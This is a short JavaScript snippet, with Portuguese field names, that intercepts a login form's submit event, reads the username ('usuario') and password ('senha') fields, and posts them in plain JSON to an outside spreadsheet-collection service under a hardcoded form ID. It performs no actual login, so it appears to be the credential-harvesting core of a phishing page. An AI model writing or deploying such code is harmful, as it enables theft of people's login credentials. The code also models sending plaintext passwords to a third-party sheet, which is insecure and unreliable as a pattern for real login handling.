const handleSubmit = (event) => {
    event.preventDefault();

    const usuario = document.querySelector('input[name=usuario]');

    const senha = document.querySelector('input[name=senha]');


    fetch('https://api.sheetmonkey.io/form/vYxUmYrnP6iBLN4T9PF9B5',{

      method: 'post',
      headers: {
        'accept': 'application/json',
        'Content-type': 'application/json',
      },
      body: JSON.stringify({
        usuario: usuario.value,
        senha: senha.value
      })
    });
}

document.querySelector('form').addEventListener('submit', handleSubmit);